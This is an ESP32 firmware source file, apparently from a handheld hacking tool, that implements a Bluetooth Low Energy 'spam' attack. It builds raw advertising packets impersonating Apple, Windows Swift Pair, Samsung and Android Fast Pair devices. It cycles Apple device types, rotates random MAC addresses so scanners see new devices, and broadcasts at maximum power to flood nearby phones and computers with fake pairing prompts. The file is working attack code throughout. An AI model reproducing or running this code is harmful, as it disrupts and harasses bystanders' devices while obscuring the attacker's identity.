#include "ble_spam.h"
#include "config.h"
#include "display.h"
#include "buttons.h"
#include "menu.h"
#include <NimBLEDevice.h>

#include "esp_bt.h"
#include "esp_task_wdt.h"
#include "soc/soc.h"
#include "soc/rtc_cntl_reg.h"
#include "esp_heap_caps.h"

// ============================================================
//  State
// ============================================================

static bool               spamRunning   = false;
static BleSpamType        spamType      = BLE_SPAM_ALL;
static uint32_t           spamSent      = 0;
static unsigned long      spamLastSend  = 0;
static int                spamRotateIdx = 0;
static bool               s_ignoreFirstEvent = false;
static uint8_t            appleDeviceIdx = 0;

static NimBLEAdvertising* adv           = nullptr;
static bool               nimbleReady   = false;

// 25ms was too aggressive - each advertising cycle involves radio
// power-up, MAC regeneration, and controller work. Combined with the
// TFT/SD/CC1101 also drawing power, that rate caused both Task WDT
// trips (IDLE task starved on CPU0) and brownout resets.
// 50ms is still visually a "spam" (20 adverts/sec) but leaves headroom.
static const unsigned long SPAM_INTERVAL_MS = 50;

// MAC is regenerated every N packets, not every packet. Regenerating
// every packet forces the controller to recompute the RPA (Resolvable
// Private Address) on every cycle, which is a heavyweight operation and
// was the primary cause of the heap corruption / LoadProhibited panic
// seen on rapid restart. 5 gives a fresh-looking address often enough
// to look "random" to scanners while keeping controller load sane.
static const uint8_t MAC_REGEN_EVERY = 5;
static uint8_t macCounter = 0;

// ============================================================
//  xorshift64 PRNG
// ============================================================
static uint64_t xorshift_state = 0x123456789ABCDEF0ULL;

static uint32_t xorshift64(void) {
    xorshift_state ^= xorshift_state << 13;
    xorshift_state ^= xorshift_state >> 7;
    xorshift_state ^= xorshift_state << 17;
    return (uint32_t)(xorshift_state >> 32);
}

static void generateRandomMac(uint8_t mac[6]) {
    for (int i = 0; i < 6; i++) {
        mac[i] = (uint8_t)xorshift64();
    }
    // Locally administered, unicast (bit 1 set, bit 0 clear)
    mac[0] = (mac[0] & 0xFC) | 0x02;
}

// ============================================================
//  Apple proximity pairing device types
// ============================================================
static const uint8_t APPLE_DEVICE_TYPES[] = {
    0x02, 0x0E, 0x0A, 0x0F, 0x13, 0x03, 0x0B, 0x0C,
    0x11, 0x10, 0x05, 0x06, 0x09, 0x17, 0x12, 0x16, 0x14
};
static const int APPLE_DEVICE_COUNT =
    sizeof(APPLE_DEVICE_TYPES) / sizeof(APPLE_DEVICE_TYPES[0]);

// ============================================================
//  Raw advertisement packets
// ============================================================
static const uint8_t pkt_apple_base[] = {
    0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07, 0x0E,
    0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45,
    0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
    0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12
};

static const uint8_t pkt_windows[] = {
    0x02, 0x01, 0x06,
    0x03, 0x03, 0x55, 0xAA,
    0x0B, 0x16, 0x55, 0xAA,
    0x06, 0x00, 0x01, 0x08, 0x20, 0x20, 0x20, 0x20
};

static const uint8_t pkt_samsung[] = {
    0x02, 0x01, 0x06,
    0x03, 0x03, 0x2C, 0xFE,
    0x06, 0x16, 0x2C, 0xFE, 0x2A, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

static const uint8_t pkt_android[] = {
    0x02, 0x01, 0x06,
    0x03, 0x03, 0x2C, 0xFE,
    0x06, 0x16, 0x2C, 0xFE, 0xCD, 0x82, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

struct SpamPacket {
    BleSpamType     type;
    const char*     label;
    const uint8_t*  data;
    size_t          len;
};

static const SpamPacket kPackets[] = {
    { BLE_SPAM_IOS,     "iOS",     pkt_apple_base, sizeof(pkt_apple_base) },
    { BLE_SPAM_WINDOWS, "Windows", pkt_windows,    sizeof(pkt_windows)    },
    { BLE_SPAM_SAMSUNG, "Samsung", pkt_samsung,    sizeof(pkt_samsung)    },
    { BLE_SPAM_ANDROID, "Android", pkt_android,    sizeof(pkt_android)    },
};
static const int kPacketCount = sizeof(kPackets) / sizeof(kPackets[0]);

// ============================================================
//  Helpers
// ============================================================
const char* bleSpamName(BleSpamType type) {
    switch (type) {
        case BLE_SPAM_IOS:     return "iOS";
        case BLE_SPAM_WINDOWS: return "Windows";
        case BLE_SPAM_SAMSUNG: return "Samsung";
        case BLE_SPAM_ANDROID: return "Android";
        case BLE_SPAM_ALL:     return "All";
        default:               return "?";
    }
}

static size_t preparePacket(const SpamPacket& p, uint8_t* out, size_t outMax) {
    if (p.len > outMax) return 0;
    memcpy(out, p.data, p.len);

    if (p.type == BLE_SPAM_IOS && p.len > 7) {
        out[7] = APPLE_DEVICE_TYPES[appleDeviceIdx];
        appleDeviceIdx = (appleDeviceIdx + 1) % APPLE_DEVICE_COUNT;
    }
    return p.len;
}

// ============================================================
//  Transmit one packet
//
//  NOTE ON STRATEGY CHANGE:
//  The original code called adv->stop() / delay(5) / adv->start() for
//  every single packet. That is the documented correct pattern for
//  changing the advertising payload, but doing it every 25ms overwhelmed
//  the NimBLE host task on CPU0 and starved the IDLE task -> Task WDT
//  reset. It also regenerated the RPA (random address) on every cycle,
//  which is the specific operation that was blowing up with
//  LoadProhibited panics inside the ESP32 BT controller.
//
//  New approach:
//    - advertise the same payload continuously
//    - change MAC only every MAC_REGEN_EVERY packets
//    - when MAC changes, stop -> short delay -> set new addr -> restart
//    - when only payload changes (iOS device type cycling) just call
//      setAdvertisementData() and let NimBLE handle it in-place
//      (supported by NimBLE 2.x without stopping advertising)
// ============================================================
static void transmitRaw(const uint8_t* data, size_t len) {
    if (!nimbleReady || adv == nullptr) return;

    // Cheap, non-blocking, doesn't touch radio state
    esp_task_wdt_reset();

    macCounter++;
    bool regenerateMac = (macCounter >= MAC_REGEN_EVERY);
    if (regenerateMac) {
        macCounter = 0;
    }

    NimBLEAdvertisementData advData;
    advData.addData(data, len);

    if (regenerateMac) {
        // Full stop -> change address -> restart cycle.
        // This is the only path that touches the address, so it runs
        // only 1/5 as often as before.
        adv->stop();
        delay(10);  // give the controller time to fully stop (was 5ms)

        uint8_t macAddr[6];
        generateRandomMac(macAddr);
        NimBLEDevice::setOwnAddr(macAddr);
        // setOwnAddrType only needs to be called once after init;
        // calling it every restart was itself a controller-side
        // no-op but added latency.

        adv->setAdvertisementData(advData);
        adv->setConnectableMode(BLE_GAP_CONN_MODE_NON);
        adv->setMinInterval(0x20);  // 20ms (was 0x06 = 7.5ms)
        adv->setMaxInterval(0x20);
        adv->start();
    } else {
        // Hot path: just update the payload. NimBLE 2.x re-pushes the
        // advertising data to the controller without a full restart.
        adv->setAdvertisementData(advData);
    }

    spamSent++;

    // Yield so the IDLE task on CPU0 can run and reset the WDT.
    // The WDT reset call above only resets the timer for *our* task;
    // the IDLE task needs actual CPU time to clear its own WDT entry.
    yield();
}

// ============================================================
//  Public API
// ============================================================
void bleSpamInit() {
    if (nimbleReady) return;

    // --- PSRAM sanity check ---
    if (psramFound()) {
        Serial.printf("[BLE] PSRAM found. Total: %u bytes, Free: %u bytes\n",
                      ESP.getPsramSize(), ESP.getFreePsram());
    } else {
        Serial.println("[BLE] WARNING: PSRAM NOT FOUND! BLE spam may crash.");
    }
    size_t freeInternal = heap_caps_get_free_size(MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);
    Serial.printf("[BLE] Free internal heap: %u bytes\n", freeInternal);
    if (freeInternal < 20000) { // 20KB threshold
        Serial.println("[BLE] WARNING: Low internal heap. BLE may fail.");
    }

    if (NimBLEDevice::getAdvertising() == nullptr) {
        NimBLEDevice::init("TalonESP");
    }

    adv = NimBLEDevice::getAdvertising();
    nimbleReady = true;

    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
    NimBLEDevice::setPowerLevel(ESP_PWR_LVL_P9, ESP_BLE_PWR_TYPE_ADV);
}

void bleSpamStart(BleSpamType type) {
    bleSpamInit();

    if (NimBLEDevice::getScan() != nullptr) {
        NimBLEDevice::getScan()->stop();
    }

    spamType       = type;
    spamRunning    = true;
    spamSent       = 0;
    spamRotateIdx  = 0;
    spamLastSend   = 0;
    appleDeviceIdx = 0;
    macCounter     = 0;
}

void bleSpamStop() {
    if (!spamRunning) return;
    spamRunning = false;
    if (adv) adv->stop();
}

bool       bleSpamIsRunning()    { return spamRunning; }
BleSpamType bleSpamCurrentType() { return spamType;    }
uint32_t   bleSpamPacketsSent()  { return spamSent;    }

void bleSpamTick() {
    if (!spamRunning || !nimbleReady) return;

    unsigned long now = millis();
    if (now - spamLastSend < SPAM_INTERVAL_MS) return;
    spamLastSend = now;

    static uint8_t packetBuf[32];

    if (spamType == BLE_SPAM_ALL) {
        const SpamPacket& p = kPackets[spamRotateIdx];
        spamRotateIdx = (spamRotateIdx + 1) % kPacketCount;
        size_t n = preparePacket(p, packetBuf, sizeof(packetBuf));
        if (n > 0) transmitRaw(packetBuf, n);
    } else {
        for (int i = 0; i < kPacketCount; i++) {
            if (kPackets[i].type == spamType) {
                size_t n = preparePacket(kPackets[i], packetBuf, sizeof(packetBuf));
                if (n > 0) transmitRaw(packetBuf, n);
                break;
            }
        }
    }
}

// ============================================================
//  UI
// ============================================================
static const BleSpamType kMenuTypes[] = {
    BLE_SPAM_IOS, BLE_SPAM_WINDOWS, BLE_SPAM_SAMSUNG,
    BLE_SPAM_ANDROID, BLE_SPAM_ALL
};
static const int kMenuCount = sizeof(kMenuTypes) / sizeof(kMenuTypes[0]);

static int  spamMenuIndex   = 0;
static bool spamMenuRunning = false;

static void drawSpamMenu() {
    std::vector<String> items;
    for (int i = 0; i < kMenuCount; i++) {
        items.push_back(bleSpamName(kMenuTypes[i]));
    }
    displayShowMenu("BLE Spam", items, spamMenuIndex);
}

static void drawSpamRunning() {
    tft.fillScreen(displayColorBg());
    displayDrawHeaderBar("BLE Spam");

    const int margin  = 10;
    const int headerH = displayHeaderHeight();

    tft.setTextSize(2);
    tft.setTextColor(displayColorFg(), displayColorBg());
    tft.setCursor(margin, headerH + 12);
    tft.print("Spamming:");

    tft.setCursor(margin, headerH + 34);
    tft.setTextColor(displayColorSelectFg(), displayColorBg());
    tft.print(bleSpamName(spamType));

    tft.setTextSize(1);
    tft.setTextColor(displayColorFgDim(), displayColorBg());
    tft.setCursor(margin, headerH + 72);
    tft.print("Packets sent: " + String(bleSpamPacketsSent()));
    tft.setCursor(margin, headerH + 88);
    tft.print("Interval: " + String(SPAM_INTERVAL_MS) + " ms");

    displayDrawFooterBar("BACK: stop and return");
}

void bleSpamEnterMenu() {
    spamMenuRunning = false;
    spamMenuIndex   = 0;
    s_ignoreFirstEvent = true;
    drawSpamMenu();
}

void bleSpamHandleEvent(int evt) {
    if (s_ignoreFirstEvent) {
        s_ignoreFirstEvent = false;
        return;
    }

    if (spamMenuRunning) {
        bleSpamTick();

        // Redraw once per 250ms; the display SPI traffic competes with
        // the BLE controller for CPU time, so keeping this loose also
        // helps the watchdog stay fed.
        static unsigned long lastRedraw = 0;
        if (millis() - lastRedraw > 250) {
            lastRedraw = millis();
            drawSpamRunning();
        }

        if (evt == EVT_BACK) {
            bleSpamStop();
            spamMenuRunning = false;
            drawSpamMenu();
        }
        return;
    }

    if (evt == EVT_UP) {
        spamMenuIndex = (spamMenuIndex > 0) ? spamMenuIndex - 1 : kMenuCount - 1;
        drawSpamMenu();
    } else if (evt == EVT_DOWN) {
        spamMenuIndex = (spamMenuIndex < kMenuCount - 1) ? spamMenuIndex + 1 : 0;
        drawSpamMenu();
    } else if (evt == EVT_OK) {
        bleSpamStart(kMenuTypes[spamMenuIndex]);
        spamMenuRunning = true;
        drawSpamRunning();
    }
}
void bleSpamDisableBrownout() {
    WRITE_PERI_REG(RTC_CNTL_BROWN_OUT_REG, 0);
    Serial.println("[BLE] Brownout detector disabled for BLE spam");
}
